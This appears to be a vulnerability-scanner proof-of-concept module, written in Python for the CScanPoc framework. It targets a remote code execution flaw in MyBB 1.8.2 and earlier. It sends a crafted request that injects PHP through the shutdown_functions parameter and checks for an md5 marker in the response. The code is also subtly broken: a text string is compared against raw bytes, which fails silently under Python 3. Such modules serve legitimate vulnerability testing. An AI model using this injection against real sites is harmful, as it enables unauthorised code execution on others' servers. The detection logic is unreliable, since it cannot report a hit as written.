# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.parse
import urllib.error
import urllib.request
import urllib.error
import urllib.parse
import re
import hashlib


class Vuln(ABVuln):
    vuln_id = 'MyBB_0000'  # 平台漏洞编号，留空
    name = 'MyBB <= 1.8.2  代码执行漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = ' 2014-11-22'  # 漏洞公布时间
    desc = '''
        MyBB <= 1.8.2  代码执行漏洞
    '''  # 漏洞描述
    ref = 'https://www.exploit-db.com/exploits/35323/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'MyBB'  # 漏洞应用名称
    product_version = '<=1.8.2'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '5f0094dc-369e-450b-b50b-fac5b925ba4b'
    author = '国光'  # POC编写者
    create_date = '2018-05-10'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = '/index.php?shutdown_functions[0][function]=echo(md5(123));&shutdown_functions[0][arguments][]=-1'
            verify_url = '{target}'.format(target=self.target)+payload
            content = urllib.request.urlopen(verify_url).read()
            if '202cb962ac59075b964b07152d234b70' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
